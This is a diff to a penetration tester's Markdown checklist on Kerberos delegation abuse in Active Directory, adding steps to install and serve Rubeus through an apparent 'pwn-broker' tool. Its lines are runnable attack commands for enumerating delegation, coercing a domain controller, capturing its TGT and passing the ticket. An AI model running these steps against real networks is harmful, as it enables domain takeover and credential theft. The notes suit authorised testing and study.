@@ -3,13 +3,18 @@
 ## Before I start
 sudo ntpdate <DCIP>
 - [ ] A ticket below wants host names, not IPs: <DCHost> and the target's FQDN resolve
-- [ ] impacket and bloodyAD are on Kali already; findDelegation reads the three kinds at once
+At the pwn-broker prompt: tool install impacket, tool install netexec and tool install bloodyad.
+- [ ] findDelegation reads the three kinds at once
 impacket-findDelegation '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
 nxc ldap <DCIP> -u '<Username>' -p '<Password>' --trusted-for-delegation
 
 ## Unconstrained: a host that keeps every TGT sent to it
 - [ ] I own a host flagged TRUSTED_FOR_DELEGATION: coerce a DC to it and keep the DC's TGT
-- [ ] Rubeus from my own tools, into upload/ for serve, run on the host I own
+At the pwn-broker prompt:
+tool install rubeus
+serve
+serve files rubeus
+- [ ] Rubeus.exe fetched on the host I own with the line serve files gives
 .\Rubeus.exe monitor /interval:5 /nowrap
 - [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module
 .\Rubeus.exe ptt /ticket:THE-BASE64
